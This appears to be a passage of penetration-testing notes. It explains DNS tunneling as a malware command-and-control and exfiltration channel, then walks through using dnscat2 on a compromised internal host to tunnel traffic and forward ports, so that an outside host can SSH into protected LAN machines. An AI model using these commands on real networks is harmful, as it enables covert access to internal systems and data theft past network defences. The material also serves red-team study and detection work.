DNS tunneling takes advantage of this fact by using DNS requests to implement a command and control channel for malware. Inbound DNS traffic can carry commands to the malware, while outbound traffic can exfiltrate sensitive data or provide responses to the malware operator’s requests. This works because DNS is a very flexible protocol. There are very few restrictions on the data that a DNS request contains because it is designed to look for domain names of websites. Since almost anything can be a domain name, these fields can be used to carry sensitive information. These requests are designed to go to attacker-controlled DNS servers, ensuring that they can receive the requests and respond in the corresponding DNS replies.

### DNSCAT2

With [dnscat](https://github.com/iagox86/dnscat2) we can use DNS as a tunnel and forward all traffic with DNS requests from one host, to connect a WAN host to an host deep and protected in the internal LAN. The **WAN-HOST** will query the **IP-B** through the DNS tunnel that **IP-A** establish with **WAN-HOST**, using **IP-C** as a resolver.

```
                DNS ------IP-C
                 |     
WAN-HOST ----- IP-A ------IP-B
   |____________||__________|

```

On the internal host, after we gain access to it, we run

```shell
./dnscat <DOMAIN>
```

And on the host in the WAN we run

```shell
dnscat2-server <DOMAIN>
```

Where the **DOMAIN** is a domain that can be resolved in the LAN. Now on the server we can interact with the tunnel created

```shell
window -i 1
```

And run the command that forwards the **LOCAL-PORT** to the **REMOTE-INTERNAL-IP** using the **REMOTE-PORT**

```shell
listen 127.0.0.1:<LOCAL-PORT> <REMOTE-INTERNAL-IP>:<REMOTE-PORT>
```

Now on the WAN host we can query the **REMOTE-INTERNAL-IP** using the tunnel, with a connection that points to **LOCAL-PORT**

```shell
ssh user@127.0.0.1 -p <LOCAL-PORT>
```